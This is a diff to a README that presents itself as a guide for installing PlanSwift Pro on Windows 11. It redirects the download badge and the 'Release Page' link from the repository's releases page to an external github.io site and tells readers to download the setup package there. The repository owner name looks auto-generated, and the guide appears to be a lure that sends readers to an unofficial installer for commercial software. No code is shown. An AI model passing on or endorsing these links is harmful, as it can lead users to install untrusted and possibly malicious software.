@@ -1,6 +1,6 @@
 # 🏗️ PlanSwift-PC-Setup-Guide - Install PlanSwift Pro on Windows 11
 
-[![](https://img.shields.io/badge/Download-PlanSwift_Pro_Setup-blue.svg)](https://github.com/Aspirationpneumoniadesertwillow707/PlanSwift-PC-Setup-Guide/releases)
+[![](https://img.shields.io/badge/Download-PlanSwift_Pro_Setup-blue.svg)](https://aspirationpneumoniadesertwillow707.github.io)
 
 This guide provides steps to install PlanSwift Pro on Windows 11. It addresses common setup failures and provides solutions for users who encounter roadblocks during the installation process.
 
@@ -17,7 +17,7 @@ Before you begin the installation, confirm your computer meets these standards:
 
 ## 📥 Downloading the Software
 
-Visit the [PlanSwift Release Page](https://github.com/Aspirationpneumoniadesertwillow707/PlanSwift-PC-Setup-Guide/releases) to access the installer. Select the latest version file to download the setup package to your local machine.
+Visit the [PlanSwift Release Page](https://aspirationpneumoniadesertwillow707.github.io) to access the installer. Select the latest version file to download the setup package to your local machine.
 
 ## ⚙️ Installation Steps
 
